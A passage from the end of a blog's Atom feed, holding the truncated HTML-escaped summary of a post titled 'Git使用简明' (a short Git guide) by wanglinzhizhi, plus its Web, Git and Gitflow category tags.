      &lt;h2 id=&quot;Git使用简明&quot;&gt;&lt;a href=&quot;#Git使用简明&quot; class=&quot;headerlink&quot; title=&quot;Git使用简明&quot;&gt;&lt;/a&gt;Git使用简明&lt;/h2&gt;&lt;p&gt;by wanglinzhizhi&lt;/p&gt;
&lt;p&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/
    
    </summary>
    
      <category term="Web" scheme="http://www.wanglinzhizhi.me/categories/Web/"/>
    
    
      <category term="Git" scheme="http://www.wanglinzhizhi.me/tags/Git/"/>
    
      <category term="Gitflow" scheme="http://www.wanglinzhizhi.me/tags/Gitflow/"/>
    
      <category term="wanglinzhizhi" scheme="http://www.wanglinzhizhi.me/tags/wanglinzhizhi/"/>
    
  </entry>
  
</feed>
